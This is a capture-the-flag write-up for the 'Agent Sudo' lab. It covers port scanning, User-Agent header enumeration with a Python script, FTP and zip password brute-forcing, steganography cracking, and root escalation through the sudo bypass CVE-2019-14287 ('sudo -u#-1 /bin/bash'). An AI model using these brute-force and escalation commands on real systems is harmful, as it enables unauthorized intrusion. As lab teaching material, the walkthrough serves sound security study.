## THM CTF - Agent Sudo

We can start changing local DNS to easily handle all the process.

```
sudo nano /etc/hosts
```

Add the record:
```
xxx.xxx.xxx.xxx	   agent.thm
```

---

> <h3>How many open ports?</h3>

Now we can proceed with an Nmap scan.
```
sudo nmap -sS agent.thm -p-
```
We discovered three open ports, and we can list the services they provide.
```
sudo nmap -sS -T4 agent.thm -p21,22,80 -sV
```
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
All these info answers the first question.

---

> <h3>How you redirect yourself to a secret page?</h3>
> <h3>What is the agent name?</h3>


As we can see from the page:
```
http://agent.thm
```
We need a ```codename``` as ```user-agent``` or better ```HTTP User-Agent```.

Bash to create the file to use.
```
for letter in {A..Z}; do echo "$letter"; done > agents.txt
```

Using ```BurpSuite``` and its utility ```Intruder``` we can set a ```Sniper attack``` using ```User-Agent``` as variable and the list we just created.

We obtain two responses:
```
C:
We found an agent named "C" that report a special message for "J"

Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```

```
R:
What are you doing! Are you one of the 25 employees? If not, I going to report this incident 
```

<details><summary><i>As an alternative we can use Python to speed up the analysis.</i></summary>

```python
import requests

target_host = "http://agent.thm"
users_file = "/home/kali/Downloads/agents.txt"

session = requests.Session()
standard_response = session.get(target_host)

try:
    with open(users_file, 'r') as file:
        for users in file:
            headers={
                    "User-Agent": users.strip()
                }
            print(headers)
            response = session.get(target_host, headers=headers)

            if response.text != standard_response.text:
                print(headers)
                print(response.text)

except FileNotFoundError:
    print(f"File not found: {users_file}")

print('End of file')
```

</details>

This answer to the second and third question.

---

> <h3>FTP password</h3>
> <h3>Zip file password</h3>
> <h3>steg password</h3>
> <h3>Who is the other agent (in full name)?</h3>
> <h3>SSH password</h3>


Now that wee have at least a name, we can try an ```FTP brute force```, as ```Chris``` password seems to be weak.

```
sudo nmap -sS -T4 agent.thm -p 21 --script ftp-brute --script-args userdb=user_agent.txt passdb=/usr/share/wordlists/metasploit/unix_passwords.txt
```

We are able to find a password.

```
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
| ftp-brute: 
|   Accounts: 
|     chris:******* - Valid credentials
|_  Statistics: Performed 255 guesses in 47 seconds, average tps: 4.8
```

We can now access to the ```FTP service``` and download all three files which are located in the destination folder.

```
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

We analyse the files to determine if there is a secret message inside.
```
steghide info cute-alien.jpg
```
Bingo! We need to find the correct passphrase.

We can try a brute force with ```stegcracker```.
```
stegcracker cute-alien.jpg /usr/share/wordlists/rockyou.txt
```
After a while we find a compatible password obtaining the message.
```
Hi james,

Glad you find this message. Your login password is *************

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
However, it’s not compatible with the steg password requested. So, we’ll have to explore alternative options.

Analysing the other file with a simple.
```
strings cutie.png
```
we discover some text near the end. This implies some sort of code hidden inside the image. So we try
```
binwalk cutie.png
```
```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```
And to extract the content.
```
binwalk -e cutie.png
```
So we are able to find a ```ZIP file``` but it is password protected.

We can try a ```brute-force attack``` with ```John The Ripper```.

We need to extract the hash.
```
zip2john 8702.zip
```
and we are ready to brute-force the password.
```
john ziphash.txt
```

The message hidden in the ```ZIP file``` is:

```
Agent C,

We need to send the picture to '*************' as soon as possible!

By,
Agent R
```
With the help of [CyberChef](https://gchq.github.io/CyberChef/) we can decode ```FromBase64 "*************"``` obtaining ```"*************"```, that is the real password for the steg file we cracked before.

---

> <h3>What is the user flag?</h3>
> <h3>What is the incident of the photo called?</h3>

Now we need to access via ```SSH``` using ```James``` credentials.
```
ssh james@agent.thm
```
In the home folder, we can find the user flag and a ```JPG``` that we need to analyse on our machine.
```
james@agent.thm:/home/james/Alien_autospy.jpg /home/kali/Downloads/agent_sudo/Alien_autopsy.jpg
```
We can do a reverse search on google and find that the image refer to ```Roswell Alien Autopsy```.

---

> <h3>CVE number for the escalation</h3>
> <h3>What is the root flag?</h3>
> <h3>(Bonus) Who is Agent R?</h3>

We can try some of the usual misconfiguration to escalate our privilege.
```
sudo -l
```
This command return something strange.
```
User james may run the following commands on agent-sudo:
(ALL, !root) /bin/bash
```
We can try to search if there is any vulnerability associated with:
```
(ALL, !root) /bin/bash
```

> The configuration (ALL, !root) /bin/bash in the sudoers file allows a user to run /bin/bash as any user except root. However, a vulnerability in sudo, CVE-2019-14287, allows users to bypass this restriction by using the command sudo -u#-1 /bin/bash, which effectively runs the command as root

So we can use:
```
sudo -u#-1 /bin/bash
```
And we are in as root! We can now easily find the root flag and the real name of Agent R!
